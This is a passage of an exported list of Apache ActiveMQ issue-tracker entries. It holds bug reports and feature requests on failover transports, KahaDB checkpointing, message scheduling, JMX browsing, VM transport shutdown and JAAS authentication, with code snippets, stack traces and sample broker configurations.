add: u&#91;4&#93; is: ssl://broker1:61616?needClientAuth=true&enabledCipherSuites=SSL_RSA_WITH_RC4_128_SHA&#91;DEBUG&#93; FailoverTransport - Failover add: u&#91;5&#93; is: TLS_DHE_DSS_WITH_AES_128_CBC_SHA&#91;WARN&#93; FailoverTransport - Transport (broker1/10.73.76.102:61616) failed to ssl://broker1:61616 , attempting to automatically reconnect due to: java.io.IOException: Unexpected error occured&#91;DEBUG&#93; FailoverTransport - Transport failed with the following exception: <java.io.IOException: Unexpected error occured>java.io.IOException: Unexpected error occured at org.apache.activemq.transport.failover.FailoverTransport.add(FailoverTransport.java:614) at org.apache.activemq.transport.failover.FailoverTransport.updateURIs(FailoverTransport.java:1049) at org.apache.activemq.transport.failover.FailoverTransport.processNewTransports(FailoverTransport.java:285) at org.apache.activemq.transport.failover.FailoverTransport.handleConnectionControl(FailoverTransport.java:265) at org.apache.activemq.transport.failover.FailoverTransport$3.onCommand(FailoverTransport.java:177)&#91;DEBUG&#93; FailoverTransport - urlList connectionList:&#91;TLS_RSA_WITH_AES_256_CBC_SHA, ssl://broker1:61616&#93;&#91;DEBUG&#93; FailoverTransport - Attempting connect to: TLS_RSA_WITH_AES_256_CBC_SHA&#91;DEBUG&#93; FailoverTransport - Connect fail to: TLS_RSA_WITH_AES_256_CBC_SHA, reason: java.io.IOException: Transport not scheme specified: &#91;TLS_RSA_WITH_AES_256_CBC_SHA&#93;&#91;DEBUG&#93; FailoverTransport - Attempting connect to: ssl://broker1:61616&#91;DEBUG&#93; FailoverTransport - Connection established&#91;INFO&#93; FailoverTransport - Successfully reconnected to ssl://broker1:61616Note that the stacktrace occurs for the same reason as AMQ-3085, but all the extra work attempting to connect to invalid uris is wasteful.  Also, the client has no need for the query string parameters of the server uris.
issueID:AMQ-3125
type:Bug
changed files:TransportConnector.java
texts:updateClusterFilter/ClientsOnRemove broken when running JMX broker
The transportConnector settings "updateClusterFilter" and "updateClusterClientsOnRemove" are not propagated to JMX managed connectors when they are created from the non-JMX managed connectos.  So, even if they are set in the XML, they don"t actually work at runtime.
issueID:AMQ-3130
type:Bug
changed files:Activator.java
texts:ActiveMQ&#39;s Activator not discovering other bundles with extensions.
None
issueID:AMQ-3134
type:Improvement
changed files:
texts:Add support of MS SQL JDBC driver (version 3.0)
I"m trying to use MS SQL database as ActiveMQ datastore, so I"ve put MS SQL driver 3.0 (sqljdbc4.jar) in $ACTIVE_MQ/lib folder and configured MS SQL datasource. But when I start ActiveMQ I get the following error message:INFO | Database adapter driver override not found for : &#91;microsoft_sql_server_jdbc_driver_3_0&#93;.  Will use default implementation. WARN | Could not create JDBC tables; they could already exist. Failure was: CREATE TABLE ACTIVEMQ_MSGS(ID BIGINT NOT NULL, CONTAINER VARCHAR(250), MSGID_PROD VARCHAR(250), MSGID_SEQ BIGINT, EXPIRATION BIGINT, MSG BLOB, PRIMARY KEY ( ID ) ) Message: Column, parameter, or variable #6: Cannot find data type BLOB. SQLState: S0007 Vendor code: 2715I found the similar problem description here: http://activemq.2283324.n4.nabble.com/activemq-and-sql-server-2008-td2367448.htmlBut it relates to 2.0 version of MS SQL driver. I can"t use version 2.0, because it complains that it does not work with java 1.6. So, I opened META-INF/services/org/apache/activemq/store/jdbc folder in $ACTIVEMQ_HOME/lib/activemq-core-5.4.2.jar and copied microsoft_sql_server_jdbc_2_0_driver as microsoft_sql_server_jdbc_driver_3_0. After that ActiveMQ started successfully. So, the workaround is to add a "microsoft_sql_server_jdbc_driver_3_0" file to "activemq-core" lib.Can you please, add this file to a code base (if this is a right solution) or provide any other changes to support JDBC driver for MS SQL (version 3.0).Thank you!
issueID:AMQ-3135
type:Improvement
changed files:DemandForwardingBridgeSupport.java
MutableBrokerFilter.java
AdvisoryBroker.java
activemq-static-network-broker2.xml
Broker.java
ErrorBroker.java
EmptyBroker.java
BrokerFilter.java
texts:ActiveMQ.Advisory.Connection messages should contain client ip/host
At present a connection advisory message recieved over stomp looks like:"ConnectionInfo": {  "commandId": 0,  "responseRequired": true,  "connectionId": {    "value": "ID:monitor1.xx.net-57901-1294599217160-5:10017"  },  "clientId": "ID:monitor1.xx.net-57901-1294599217160-5:10017",  "userName": "",  "password": "",  "brokerMasterConnector": false,  "manageable": false,  "clientMaster": true,  "faultTolerant": false,  "failoverReconnect": false}}Where monitor1.xx.net is the broker name.It would be very useful if these messages also included the IP Address, Hostname, Port of the client connecting.There other advisories that would also greatly benefit from this like ActiveMQ.Advisory.NetworkBridgethanks
issueID:AMQ-3137
type:Improvement
changed files:
texts:Outbound bridges should handle remote connectivity problems at startup
With a JMS-to-JMS bridge, one can configure JmsQueueConnector or JmsTopicConnector in an outbound bridge mode. In this mode, the "foreign" JMS provider is a remote service and therefore subject to disconnections, failures, etc.While the connectors do support reconnecting to a remote provider, the connectors will not start up correctly if the remote service is not available at start-up time.The attached patch (with test cases) solves this problem by separating the initialization of the local and remote parts of the bridge. A failure during initialization of the remote broker is not considered fatal, since the bridge attempts to reconnect to the foreign provider when a message is received from the local broker anyway. This logic could also be implemented for inbound bridges but slightly more difficult in that it"ll require a separate Thread to manage the connectivity state to the remote i.e. if the system fails to connect to the remote at startup time, a separate Thread can be created to periodically continue to try to connect. This would also apply for inbound bridges that lose their connection due to the remote losing connectivity or being recycled. This has not been done yet.
issueID:AMQ-3138
type:Improvement
changed files:ActiveMQComponent.java
texts:The Camel ActiveMQComponent should default create ActiveMQConnectionFactory with the provided broker url
When using the ActiveMQComponent to create a Camel component and you provide the broker URL as follows on the static method on ActiveMQComponent:ActiveMQComponent activemq = activeMQComponent(""vm://localhost?broker.persistent=false&broker.useJmx=false");It does not set a default ActiveMQConnectionFactory with that provided URL. So later when it creates a new connection factory it will fallback and use the default tcp://localhost:61616 url instead.This code    public static ActiveMQComponent activeMQComponent(String brokerURL) {        ActiveMQComponent answer = new ActiveMQComponent();        if (answer.getConfiguration() instanceof ActiveMQConfiguration) {            ((ActiveMQConfiguration) answer.getConfiguration())                    .setBrokerURL(brokerURL);        }        return answer;    }Should be changed to add a default connection factory as well    public static ActiveMQComponent activeMQComponent(String brokerURL) {        ActiveMQComponent answer = new ActiveMQComponent();        if (answer.getConfiguration() instanceof ActiveMQConfiguration) {            ((ActiveMQConfiguration) answer.getConfiguration())                    .setBrokerURL(brokerURL);        }        // set the connection factory with the provided broker url        answer.setConnectionFactory(ActiveMQConnectionFactory(brokerURL));        return answer;    }I dont have AMQ code checked out and cannot provided a patch. But it should be simple to improve as shown above.
issueID:AMQ-3139
type:Improvement
changed files:CamelEndpointLoader.java
texts:Remove queue and topic endpoints in Camel when they are removed in CamelEndpointLoader
The CamelEndpointLoader has code which isn"t currently used    protected void removeQueue(ActiveMQQueue queue) throws Exception {        String queueUri = getQueueUri(queue);        // lur cache of endpoints so they will disappear in time        // this feature needs a new component api - list available endpoints        //camelContext.removeEndpoints(queueUri);    }Likewise for the removeTopic method.The CamelContext API has the removeEndpoints API. See CAMEL-2988
issueID:AMQ-3140
type:Bug
changed files:
texts:Lost messages when scheduling messages concurrently
We observed some problems with the scheduler component. One issue is, that the kaha db files from the scheduler won"t be removed. On further investigation I found a potential cause which could be exposed by a test. When messages are send concurrently delayed by the scheduler, messages will be lost. It seems that the schedule method on JobSchedulerImpl should be synchronized.
issueID:AMQ-3141
type:Bug
changed files:
texts:Messages may be lost when schedule them with a short delay
The message scheduler has an optimization, that the schedule time will be aligned to seconds. All messages which included in the same second will be maintained in one store entry with a list of jobs. The list will be read from the store during the main loop, the entries will be executed and the list will be deleted from the store. When new messages are added on the same list during the scheduling, these messages could be lost.One possible fix could be, that the main loop reads and removes the lists in one atomic step due to a synchronization.
issueID:AMQ-3142
type:Bug
changed files:activemq-karaf.xml
pom.xml
features.xml
ActiveMQCommand.java
texts:Prepare the upgrade to Karaf 2.2
ActiveMQ 5.4.x uses Karaf 2.1.0.Karaf 2.2.0 will be released soon. A change affects ActiveMQ: a new Felix gogo version.For instance, if you try to deploy ActiveMQ 5.4.2 on Karaf 2.1.99-SNAPSHOT, you will get an unresolved constraint as the Felix Gogo export package changed.In preparation for the support of Karaf 2.2.0, I"m gonna submit a patch to update the Import-Package and use the corresponding Gogo version.
issueID:AMQ-3143
type:Bug
changed files:
texts:JMX attribute change doesn&#39;t affect store usage
When producer is blocked on store usage limit, increasing the limit in JConsole doesn"t unblock the producer
issueID:AMQ-3146
type:Improvement
changed files:
texts:Add original destination to Stomp messages received from DLQ
When received from DLQ via Stomp, there"s no way to find out what was the original destination the message was sent to
issueID:AMQ-3148
type:Improvement
changed files:LoggingBrokerPlugin.java
texts:LoggingBrokerPlugin addConnection(..) log output is meaningless
At the moment the log output is as follows:" INFO | Adding Connection : org.apache.activemq.broker.ConnectionContext@e75be38"As far as I can judge this, the problem is that the ConnectionContext and not the ConnectionInfo is displayed.public void addConnection(ConnectionContext context, ConnectionInfo info) throws Exception {        if (isLogAll() || isLogConnectionEvents()) {            LOG.info("Adding Connection : " + context); // <-- here        }        super.addConnection(context, info);    }
issueID:AMQ-3149
type:Bug
changed files:
texts:concurrentStoreAndDispatchQueues when cache disabled can lead to skipped message dispatch, leaving message pending for some time
concurrentStoreAndDispatchQueues is on by default for the kahaDB store. It allows dispatch to happen concurrently with persistence to disk. It has a dependency on the cache to do the immediate dispatch.(The idea is that a quick ack can cancel the async message add.) On a message send, there is a dispatch attempt, if the cache is disabled and the store has not yet seen the message, the dispatch does nothing. problem! The next dispatch attempt will only occur when there is a new message, an ack is received or when the expiry processing (default 30 seconds) kicks in. The result is delayed dispatch or unexpected message expiry.The cache can be disabled on startup if there are pending messages in the store for the default store based cursor.Workaround: A simple workaround is to disable concurrentStoreAndDispatchQueues via config <kahaDB .... concurrentStoreAndDispatchQueues="false" />Fix: Async storage should be conditional on the cache being enabled.
issueID:AMQ-3153
type:Bug
changed files:
texts:An expired message that is consumed and resent with an updated expiration never expires again.
Symptom========We have a use case where a producer sends a message to a queue with an expiration.  When the message expires to the DLQ, a consumer on the DLQ receives the message, modifies it, and resends it to the original queue with an updated expiration.When the expired message is resent, it is given a new JMS message ID, so is, for all intents and purposes, a new message.  However, althought the resent message has an updated expiration, it never expires to the DLQ.Cause=====When a message expires, an "originalExpiration" property is added to the message by RegionBroker.stampAsExpired:    private boolean stampAsExpired(Message message) throws IOException {        boolean stamped=false;        if (message.getProperty(ORIGINAL_EXPIRATION) == null) {            long expiration=message.getExpiration();                 message.setProperty(ORIGINAL_EXPIRATION,new Long(expiration));            stamped = true;        }        return stamped;    }When the consumer receives and resends the expired message, ActiveMQSession gives the message a new ID and updates its expiration:    protected void send(ActiveMQMessageProducer producer, ActiveMQDestination destination, Message message, int deliveryMode, int priority, long timeToLive,                        MemoryUsage producerWindow, int sendTimeout) throws JMSException {..            long expiration = 0L;            if (!producer.getDisableMessageTimestamp()) {                long timeStamp = System.currentTimeMillis();                message.setJMSTimestamp(timeStamp);                if (timeToLive > 0) {                    expiration = timeToLive + timeStamp;                }            }            message.setJMSExpiration(expiration);...            // Set the message id.            if (msg == message) {                msg.setMessageId(new MessageId(producer.getProducerInfo().getProducerId(), sequenceNumber));            } else {                msg.setMessageId(new MessageId(producer.getProducerInfo().getProducerId(), sequenceNumber));                message.setJMSMessageID(msg.getMessageId().toString());            }...At this point the resent message has a new ID and a new expiration, so it should be allowed to reexpire.  However, the resent message still carries the originalExpiration property, which makes RegionBroker report the message has not expired (even though it may have):    @Override    public boolean isExpired(MessageReference messageReference) {        boolean expired = false;        if (messageReference.isExpired()) {            try {                // prevent duplicate expiry processing                Message message = messageReference.getMessage();                synchronized (message) {                    expired = stampAsExpired(message);                }            } catch (IOException e) {                LOG.warn("unexpected exception on message expiry determination for: " + messageReference, e);            }        }        return expired;    }Since the broker is not reporting the message as expired, the expired message processing in Queue bypasses the message (from Queue.doBrowse()):                                if (broker.isExpired(node)) {                                    LOG.debug("expiring from messages: " + node);                                    messageExpired(connectionContext, createMessageReference(node.getMessage()));                                }                                messages.remove();Solution=======Whenever a message is sent to a broker from a message producer, it should have its originalExpiration property cleared.  I"ve provided a patch in ActiveMQSession to do this, but I"m not familiar enough with the workflow to know if this is the appropriate place &#8212; I"m specifically unhappy with the need to case the javax.jms.Message to an ActiveMQMessage in order to clear the readonly properties.
issueID:AMQ-3157
type:Bug
changed files:
texts:Garbage collecting inactive destinations does not work with queue mirroring
When using the garbage collection feature of inactive queues, the queues are not collected if queue mirroring is turned on.  The following snippet shows a basic configuration for reproducing the problem:<broker xmlns="http://activemq.apache.org/schema/core"          brokerName="localhost"          dataDirectory="${activemq.base}/data"          destroyApplicationContextOnStop="true"          schedulePeriodForDestinationPurge="10000">        <destinationInterceptors>            <mirroredQueue copyMessage="true" postfix="" prefix="Monitor."/>        </destinationInterceptors>        <destinationPolicy>            <policyMap>                <policyEntries>                    <!-- Set auto-cleanup of inactive topics and queues -->                    <policyEntry queue=">" producerFlowControl="true" memoryLimit="50mb" gcInactiveDestinations="true" inactiveTimoutBeforeGC="30000">                        <pendingQueuePolicy>                            <vmQueueCursor/>                        </pendingQueuePolicy>                    </policyEntry>                    <policyEntry topic=">" producerFlowControl="true" memoryLimit="50mb" gcInactiveDestinations="true" inactiveTimoutBeforeGC="30000">                        <pendingSubscriberPolicy>                            <vmCursor />                        </pendingSubscriberPolicy>                    </policyEntry>                </policyEntries>            </policyMap>        </destinationPolicy></broker>With this configuration, the topics will be collected, but the queues will not be collected.  In order to get the queues to be collected, the <destinationInterceptors> section needs to be commented out.
issueID:AMQ-3159
type:Improvement
changed files:MessageDatabase.java
texts:Log file offset in addition to file location in checkpointUpdate()
We have been trying to troubleshoot issues with messages not being deleted from the KahaDB store, and have determined that in our case, it is often due to uncommitted transactions. MessageDatabase.checkpointUpdate() logs the location of the first open transaction, but not the filenumber. This patch logs both, to make finding the offending transaction easier.
issueID:AMQ-3160
type:Bug
changed files:Journal.java
texts:ConcurrentModificationException in ActiveMQ Journal Checkpoint Worker
There appears to be a race condition accessing Journal.getHashMap() from the ActiveMQ Journal Checkpoint Worker thread. Under high loads, we occasionally see the following exception in our logs:Exception in thread "ActiveMQ Journal Checkpoint Worker" java.util.ConcurrentModificationException      at java.util.HashMap$HashIterator.nextEntry(HashMap.java:793)      at java.util.HashMap$EntryIterator.next(HashMap.java:834)      at java.util.HashMap$EntryIterator.next(HashMap.java:832)      at java.util.AbstractMap.putAll(AbstractMap.java:255)      at java.util.TreeMap.putAll(TreeMap.java:304)      at java.util.TreeMap.<init>(TreeMap.java:162)      at org.apache.kahadb.journal.Journal.getFileMap(Journal.java:660)      at org.apache.activemq.store.kahadb.MessageDatabase.checkpointUpdate(MessageDatabase.java:970)      at org.apache.activemq.store.kahadb.MessageDatabase.access$400(MessageDatabase.java:82)      at org.apache.activemq.store.kahadb.MessageDatabase$9.execute(MessageDatabase.java:599)      at org.apache.kahadb.page.Transaction.execute(Transaction.java:728)      at org.apache.activemq.store.kahadb.MessageDatabase.checkpointCleanup(MessageDatabase.java:597)      at org.apache.activemq.store.kahadb.MessageDatabase$3.run(MessageDatabase.java:249)This leads to the thread aborting prematurely.
issueID:AMQ-3161
type:Bug
changed files:MessageDatabase.java
texts:Race condition in ActiveMQ Journal Checkpoint worker thread cleanup leads to multiple running instances
If the ActiveMQ Journal Checkpoint worker thread dies for any reason, any updates to KahaDB trigger the thread to be restarted. Unfortunately, there is a race condition between the Thread.isAlive() check and the restart of the thread, potentially leading to multiple instances of the thread being spawned.  We have observed in a busy environment as many as 8-10 instances of this thread, all waking up every 5 seconds to perform database checkpoints, bringing throughput on the broker to a halt.The attached patch adds a lock around access to creation/destruction of this thread and prevents a second instance from being launched inadvertently.
issueID:AMQ-3162
type:Bug
changed files:MessageDatabase.java
texts:ActiveMQ checkpoint worker makes unnecessary repeated calls to Journal.getFileMap(), leading to excessive memory usage
During its cleanup run (default every 30 seconds), MessageDatabase.checkpointUpdate() attempts to determine which data files are safe to delete. It calls Journal.getFileMap() repeatedly within a loop to determine if the file is referenced in memory. Journal.getFileMap() creates a new TreeMap from the underlying map. Unfortunately, as the number of data files grows on a busy broker, this can be called hundreds or even thousands of times, leading to excessive run time, memory churn, and overall poor performance (observed in our environment).The attached patch simply moves the call to getFileMap() outside the loop so that it runs in O(gcCandidates.size) vs. O(gcCandidates.size * fileMap.size).
issueID:AMQ-3166
type:Bug
changed files:
texts:client calls to createProducer() and send() successful even though BrokerFilter methods throw exceptions
Client calls to createProducer() always return without an error even though a BrokerFilter"s addProducer() method throws an exception on the request. In contrast, createConsumer() throws an exception, as expected, when BrokerFilter"s addConsumer() throws an exception.Clients using transacted sessions always return successfully from send() when a BrokerFilter"s send() method throws an exception.Below is a broker configuration file using <authorizationPlugin> to illustrate the problem.To reproduce the problem With this configuration, a test client only needs to connect with user = "user" and password = "password", and then attempt to produce messages with a transacted session to any queue other than ABC (e.g. DEF).Tracing the cause of the issue has lead to finding that the client code for creating a producer uses an Async send for the producer information.  The analogous code for consumers uses a Sync send.I will work on a patch.  It would be very helpful to have feedback on the operation of the bus and the best way to resolve this problem.  Based on my research, it seems that createProducer() should be using a Sync send in place of the Async one.  Not yet sure about send().  Another possibility is to move the security operations to earlier in the internal broker flow.=== SAMPLE BROKER XML ===<beans  xmlns="http://www.springframework.org/schema/beans"  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.0.xsd  http://activemq.apache.org/schema/core http://activemq.apache.org/schema/core/activemq-core.xsd">    <broker xmlns="http://activemq.apache.org/schema/core"            brokerName="localhost"            dataDirectory="${activemq.base}/data"            destroyApplicationContextOnStop="true" >        <persistenceAdapter>            <kahaDB directory="${activemq.base}/data/kahadb"/>        </persistenceAdapter>        <plugins>          <simpleAuthenticationPlugin anonymousAccessAllowed="true">              <users>                  <authenticationUser username="user" password="password"                      groups="users"/>              </users>          </simpleAuthenticationPlugin>          <authorizationPlugin>              <map>                  <authorizationMap>                    <authorizationEntries>                      <authorizationEntry queue="ABC" read="users" write="users" admin="users" />                      <authorizationEntry topic="ActiveMQ.Advisory.>" read="users" write="users" admin="users" />                    </authorizationEntries>                  </authorizationMap>              </map>          </authorizationPlugin>        </plugins>        <transportConnectors>            <transportConnector name="openwire" uri="tcp://0.0.0.0:61616"/>        </transportConnectors>    </broker></beans>
issueID:AMQ-3167
type:Bug
changed files:
texts:possible skipped Queue messages in memory limited configuration with fast consumers
regression in test from https://issues.apache.org/jira/browse/AMQ-2413 required some investigation. Symptom was missing messages, turned out to be in the middle of the sequence. Issue with the priority kahadb cursors and setbatch. Set batch is invoked when the cursor memory is exhausted such that replay from the store can start at the correct point. If a call to setBatch was followed by a call to recover when there was still no memory space available, the cursor could skip the next pending message.
issueID:AMQ-3168
type:Bug
changed files:BrokerService.java
texts:Broker XSD: boolean attributes should permit value injection via Srping&#39;s PropertyPlaceholderConfigurer
i"m working on upgrading from AMQ 5.3.0 to 5.4.2. i"d like to keep schema validation enabled, so i"m carefully re-ordering the elements in activemq.xml.Our configuration uses PropertyPlaceholderConfigurer to insert values into activemq.xml. One of our configured values is of XSD type "boolean":        <managementContext>            <managementContext createConnector="${enableJmx}" connectorPort="${jmxConnectorPort}"/>        </managementContext> i"m seeing this error in the console when i run "activemq/bin/activemq-admin start":ERROR: java.lang.RuntimeException: Failed to execute start task. Reason: org.springframework.beans.factory.xml.XmlBeanDefinitionStoreException: Line 128 in XML document from class path resource &#91;activemq.xml&#93; is invalid; nested exception is org.xml.sax.SAXParseException: cvc-datatype-valid.1.2.1: "${enableJmx}" is not a valid value for "boolean".Other replacement tokens that precede this in the file don"t produce errors, but they"re for string or numeric values, not booleans. Issue AMQ-2939 mentions accomodating numeric vbalues in the broker.xsd. It would be very useful to accomodate boolean values as well, for both configurability and backward compatibility with existing configurations.
issueID:AMQ-3173
type:Improvement
changed files:MessageQuery.java
texts:Better representation of ActiveMQMessage messages on server page message.jsp.
If you look at a ActiveMQMessage message via the message.jsp page - there is little information about the content/information of this advisory message. I"ll guess that it would be useful for the administrator who looks at the messages via the web-interface to have more information.I"ll add a very simple/stupid workaround patch to the issue - but the real solution might be costlier.
issueID:AMQ-3174
type:Improvement
changed files:
texts:ConsumerTool (in examples) should show how to do batch acknowledgement using either transacted session or CLIENT_ACKNOWLEDGE
I"ve updated the ConsumerTool (and the build.xml) to allow testing / demonstration of batch acknowledgements, using either CLIENT_ACKNOWLEDGE or transacted session. Can someone review and commit?
issueID:AMQ-3175
type:Improvement
changed files:HttpClientTransport.java
texts:Allow setting soTimeout for Http/Https transports
Currently the value is hardcoded to 30 secs
issueID:AMQ-3176
type:Bug
changed files:
texts:Potential deadlock in duplex network connector recreation, resulting in dangling connections
End result is lots of connections that are taking too long to shutdown and in particular: 2011-02-07 08:56:49,422 | INFO  | sport: tcp:///xxx:56982 | TransportConnection | The connection to "/xxx:56981" is taking a long time to shutdown.....2011-02-07 08:56:49,458 | INFO  | sport: tcp:///xxx:56981 | TransportConnection | The connection to "/xxx:56982" is taking a long time to shutdown. where there is an overlap, with two connections trying to stop each other.Problem appears when the initiator of a duplex network connector sees a failure and trys to reconnect and the responder sees the old transport connector in place. It tries to stop the existing connection but does it in a sync call so the potential to block and lock is present.2011-01-26 16:35:54,618 &#91;..&#93; INFO TransportConnection - The connection to "/xx:51585" is taking a long time to shutdown.2011-01-26 16:35:56,500 &#91;..&#93; INFO TransportConnection - The connection to "/xx:51585" is taking a long time to shutdown.In particular,
issueID:AMQ-3177
type:New Feature
changed files:
texts:Switch to use slf4j as logger (instad of commons logging)
http://slf4j.org/migrator.html can probably help
issueID:AMQ-3178
type:Improvement
changed files:
texts:5.3.x clients to 5.4 brokers always get updated cluster information in the broker info, this should be configurable
http://svn.apache.org/viewvc?rev=1057565&view=rev makes broker info propagation to the failover transport conditional on transport connector updateClusterClients. This effects the connection control command. However, 5.3.x clients use the brokerInfo to obtain peer cluster info. The presence of the peer broker infos in the returned broker info should also be conditional on updateClusterClients.
issueID:AMQ-3180
type:Bug
changed files:
texts:JMX Browse of BytesMessage fails with javax.management.openmbean.OpenDataException: Argument&#39;s element itemValues[8]="[B@de15a0" is not a valid value for this item
delivery of messages is not effected, but a browse returns no results via jmx and exceptions appear on the broker, eg:2011-01-24 05:20:05,672 [)-209.114.68.32] WARN DestinationViewMBean - exception browsing destination javax.management.openmbean.OpenDataException: Argument"s element itemValues[15]="[B@8e3f75" is not a valid value for this item (itemName=BodyPreview,itemType=javax.management.openmbean.ArrayType(name=[Ljava.lang.Byte;,dimension=1,elementType=javax.management.openmbean.SimpleType(name=java.lang.Byte))).atjavax.management.openmbean.CompositeDataSupport.<init>(CompositeDataSupport.java:145)atjavax.management.openmbean.CompositeDataSupport.<init>(CompositeDataSupport.java:190)At org.apache.activemq.broker.jmx.OpenTypeSupport.convert (OpenTypeSupport.java:398)At org.apache.activemq.broker.jmx.DestinationView.browseMessages (DestinationView.java:195)At org.apache.activemq.broker.jmx.DestinationView.browseMessages(DestinationView.java:176)At sun.reflect.GeneratedMethodAccessor45.invoke (Unknown Source)At sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:25)At java.lang.reflect.Method.invoke (Method.java:592)At com.sun.jmx.mbeanserver.StandardMetaDataImpl.invoke (StandardMetaDataImpl.java:414)At com.sun.jmx.mbeanserver.MetaDataImpl.invoke (MetaDataImpl.java:220)...
issueID:AMQ-3181
type:Bug
changed files:IntrospectionSupport.java
texts:ActiveMQConnectionFactory fails in an Applet enviroment
Initial error report can be found here: http://stackoverflow.com/questions/4997117/applet-not-getting-initialized-on-the-browser-while-using-jms-to-connect-to-activ
issueID:AMQ-3182
type:Bug
changed files:
texts:JAAS PropertiesLoginModule does not maintain internal validity state, so will commit in error after an invalid login attempt
Issue visible when using the JaasDualAuthenticationPlugin which uses two login modules. An failed login attempt as system (with wrong password) will still succeed with the guest module, but the principals should be restricted to the guest role. They are not as the failed system module still commits in error.
issueID:AMQ-3183
type:New Feature
changed files:
texts:Set JMSXUserID value based on authenticated principal
When using the JaasDualAuthenticationPlugin, a user with id "system" can gain the guest credentials but still remain with the "system" username which gets into a produced message via the JMSXUserID property.It would be nice if the userName reflected the first authenticated UserPrincipal, such that a user "system" authenticated to default role "guest" after a failed login, proceeds to use the "guest" userName.
issueID:AMQ-3184
type:Improvement
changed files:
texts:Upgrade to Camel 2.6.0
None
issueID:AMQ-3185
type:Bug
changed files:
texts:Closing a VMTransport can cause all other VMTransports to be prematurely closed
Symptom=======We have eight servers running AMQ 5.3.1 connected in a network-of-brokers over HTTP.  Each broker maintains local connections to internal consumers using the VM transport.  We were noticing that about once every day, all the local VM connections on a broker and the outbound network bridge connections would fail with the following error:2010-12-10 04:29:11,663 &#91;processBroker-process-pool-thread-4&#93; ERROR - The worker encountered an exception and will pause for 5 seconds before continuing.javax.jms.JMSException: Peer (vm://broker-mbus-200005#1052452) disposed. at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:62) at org.apache.activemq.ActiveMQMessageConsumer.dequeue(ActiveMQMessageConsumer.java:453) at org.apache.activemq.ActiveMQMessageConsumer.receive(ActiveMQMessageConsumer.java:570) at com.invoqsystems.foundation.component.communication.jms.source.JMSMessageSource.getMessage(JMSMessageSource.java:33) at com.invoqsystems.foundation.component.communication.jms.source.JMSMessageSource.getMessage(JMSMessageSource.java:95) at com.invoqsystems.foundation.component.communication.jms.worker.MessageProcessingWorker.getTask(MessageProcessingWorker.java:9) at com.invoqsystems.foundation.component.communication.jms.worker.AbstractWorker.iterate(AbstractWorker.java:14) at com.invoqsystems.foundation.component.communication.jms.worker.AbstractWorker.runUntilStop(AbstractWorker.java:17) at com.invoqsystems.foundation.component.communication.jms.worker.AbstractWorker.run(AbstractWorker.java:41) at java.lang.Thread.run(Unknown Source)Caused by: org.apache.activemq.transport.TransportDisposedIOException: Peer (vm://broker-mbus-200005#1052452) disposed. at org.apache.activemq.transport.vm.VMTransport.stop(VMTransport.java:70) at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:64) at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:64) at org.apache.activemq.transport.ResponseCorrelator.stop(ResponseCorrelator.java:132) at org.apache.activemq.broker.TransportConnection.doStop(TransportConnection.java:956) at org.apache.activemq.broker.TransportConnection$3.run(TransportConnection.java:918) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(Unknown Source) at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source) ... 1 moreThis was quite unexpected since we create the VM transport connection at broker startup and maintain it (the single connection) throughout the life of the application.  The connection is only closed when the process terminates and the broker is stopped.Since we wrote our consumers against the JMS spec, we handle periodic connection failures by creating a new connection.  This works fine sometimes; however, because of AMQ-3127, the sudden reregistration of our consumers simultaneously occurring with bridge re-creation causes frequent deadlock that can only be resolved by restarting the systems.Cause=====We were unable to reliably recreate the failure, so it became clear that a timing issue was involved.  Eventually, we determined the cause of the VM transport failure was due to the following code in VMTransportServer:VMTransportServer.java    public VMTransport connect() throws IOException {        TransportAcceptListener al;        synchronized (this) {            if (disposed) {                throw new IOException("Server has been disposed.");            }            al = acceptListener;        }        if (al == null) {            throw new IOException("Server TransportAcceptListener is null.");        }        connectionCount.incrementAndGet();        VMTransport client = new VMTransport(location) {            public void stop() throws Exception {                if (disposed) {                    return;                }                super.stop();                if (connectionCount.decrementAndGet() == 0 && disposeOnDisconnect) {                    VMTransportServer.this.stop();                }            };        };        VMTransport server = new VMTransport(location);        client.setPeer(server);        server.setPeer(client);        al.onAccept(configure(server));        return client;    }At issue is the override VMTransport.stop() method:VMTransportServer.java            public void stop() throws Exception {                if (disposed) {                    return;                }                super.stop();                if (connectionCount.decrementAndGet() == 0 && disposeOnDisconnect) {                    VMTransportServer.this.stop();                }            };Note that VMTransport.disposed is used to protect against multiple calls and subsequently multiple decrements of connectionCount.  However, in the implementation of super.stop(), the disposed flag is only set after the peer transport is informed of the stop:VMTransport.java    public void stop() throws Exception {        stopping.set(true);                // If stop() is called while being start()ed.. then we can"t stop until we return to the start() method.        if( enqueueValve.isOn() ) {                     // let the peer know that we are disconnecting..            try {>>>                peer.transportListener.onCommand(new ShutdownInfo());            } catch (Exception ignore) {            }                              TaskRunner tr = null;            try {                enqueueValve.turnOff();                if (!disposed) {                    started = false;>>>                    disposed = true;                    if (taskRunner != null) {                        tr = taskRunner;                        taskRunner = null;                    }                }            } finally {                stopping.set(false);                enqueueValve.turnOn();            }            if (tr != null) {                tr.shutdown(1000);            }                    }            }TransportConnection implements of peer.transportListener.onCommand(new ShutdownInfo()) by launching a asynchronous task that eventually calls back to the same transport that initiated the closure.  If the timing is right, VMTransportServer"s VMTransport.stop() method is called a second time before the disposed flag is set to true.  As a result, the connectionCount is decremented TWICE instead of just once.In other words, the diposed check and decrement as implemented by VMTransport"s anonymous VMTransport subclass are not thread-safe.  If VMTransportServer miscounts the connections, it can end up stopping itself while there are still live connections.  The result is that the live connections see their peer (the server part of the VMTransport) unexpectedly closed.Solution========The attached patch prevents multiple decrements of the connectionCount by preventing reentrant calls to VMTransportServer"s VMTransport stop() method.A patch is included which demonstrates the problem with the existing AMQ trunk code.
issueID:AMQ-3186
type:New Feature
changed files:JmsProducerClient.java
JmsConsumerClient.java
JmsConsumerProperties.java
JmsProducerProperties.java
texts:Allow producer and consumer throttling in maven-activemq-perf-plugin
I know the maven-activemq-perf-plugin is mainly for testing the highest possible throughput.However its a great plug-in for running all sorts of tests, not just for measuring the maximum performance. What I was always looking for is a way to throttle consumer and producer when running test with this plug-in. I propose to add two configuration properties: consumer.recvDelay and producer.sendDelay to the test suite. Both variables would take a long value in milliseconds, whose default value is 0 (no throttling).  Proposed patch attached.
